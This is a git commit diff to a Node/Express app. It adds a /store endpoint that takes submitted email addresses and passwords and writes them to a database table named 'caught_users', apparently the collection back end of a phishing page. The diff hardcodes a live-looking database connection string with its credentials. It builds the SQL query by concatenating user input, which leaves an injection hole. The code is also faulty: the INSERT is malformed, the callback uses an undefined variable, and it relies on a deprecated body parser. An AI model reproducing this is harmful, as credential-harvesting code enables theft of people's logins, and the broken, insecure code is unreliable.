b3827c58658b89f1f05a86ef692b9b6d4b0a7b00
Angela Evans <aevans@lelandmanagement.com>
2015-09-23 12:00:02 -0400

    Call Progress Maybe

--- index.js
+++ index.js
@@ -1,11 +1,15 @@
 var express = require('express');
-var app = express();
 
 var pg = require('pg');
+var bodyParser = require('body-parser');
+
+var app = express();
 
 app.set('port', (process.env.PORT || 5000));
 
 app.use(express.static(__dirname + '/public'));
+app.use(express.bodyParser());
+app.use(express.urlencoded({ extended: true }));
 
 // views is directory for all template files
 app.set('views', __dirname + '/views');
@@ -28,6 +32,25 @@ app.get('/db', function (request, response) {
     });
   });
 })
+
+app.post('/store', function(req, res){
+	var email = req.body.email;
+	var password = req.body.password;
+	
+	var connectStr = "postgres://hhlorjpztogkxd:_jYL2Fa1mJSepcyKvJk8_S1WJ2@ec2-46-137-159-123.eu-west-1.compute.amazonaws.com:5432/d6q5sdg1cfttg7?ssl=true"
+	pg.connect(connectStr, function(err, client, done) {
+	  
+		client.query('INSERT INTO caught_users (' + email + ', ' + password + ')', function(err, result) {
+		  done();
+		  if (err)
+		   { console.error(err); response.send("Error " + err); }
+		  else
+		   { response.render('pages/db', {results: result.rows} ); }
+		});
+	});
+	
+	res.end("yes");
+});
 
 app.listen(app.get('port'), function() {
   console.log('Node app is running on port', app.get('port'));
